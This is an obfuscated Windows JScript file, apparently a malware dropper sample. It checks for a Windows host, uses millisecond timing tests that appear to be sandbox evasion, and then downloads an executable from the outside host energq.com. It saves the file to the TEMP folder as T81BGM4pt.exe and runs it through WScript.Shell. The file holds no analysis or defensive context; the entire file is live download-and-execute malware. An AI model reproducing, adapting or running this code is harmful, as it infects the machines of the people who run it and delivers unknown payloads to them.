var vC = false;
var if0 = "CreateObject";
var vu = function B() {return WScript[if0]("WScript.Shell");}(), d = 11;
var b = "MSXML2.XMLHTTP";
var nI = 2123213;
var tx = 0;
function l(I){vu["Run"](I, tx, tx);};
function o(){return "" + b;};
function k(lu, L){tx = tx * 1; return lu - L;};
function SK(){return if0;};
/*@cc_on
  @if (@_win32 || @_win64)
    vC = true;
  @end
@*/
if (vC)
{
var WE = "";
function Mi(){return 22;};
var Rl = 0; var R = 0;
function H()
{
var a = new this["Date"]();
var zw = a["getUTCMilliseconds"]();
WScript["Sleep"](Mi());
var a = new this["Date"]();
var nF = a["getUTCMilliseconds"]();
WScript["Sleep"](Mi());
var a = new this["Date"]();
var M = a["getUTCMilliseconds"]();
var Rl = "K";
Rl = k(nF, zw);
var R = "mf";
R = k(M, nF);
WE = "open";
return k(Rl, R);
}
var Dh = false;
var Hv0 = false;
for (var D = tx; D < Mi() * 1; D++){if (H() != tx){
Dh = true; 
R = "31" + 11 * Rl + R; 
Hv0 = true; 
break;
}}
function cO() {return ((Dh == true) && (Dh == Hv0)) ? 1 : tx;};
if (Dh && cO() && Hv0){
function tY() {return vu["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "T81BGM4pt.exe";};
 D0 = o();
 c = WScript[if0](D0);
 var Yg = 1;
 while (Yg){
try {
c[WE]("GET", "http://energq.com/e3ola", false);
c["send"]();
T = "Sleep";
for (;;){WScript[T](Mi() * 11); if (c["readystate"] >= 2 * 2) break;};
Yg = tx;
} catch(kU){};
}
function dC(Ug) {var J = (1, 2, 3, 4, 5, Ug); return J;};
eh = WScript[SK()]("ADODB.Stream");
D0 = eh;
D0[WE]();
D0["type"] = dC(1);
D0["write"](c["ResponseBody"]);
eh["position"] = dC(tx);
D0["Save" + "ToFile"](tY(), 2);
eh["c"+"lose"]();
Hv = tY();
l(Hv);
}
}

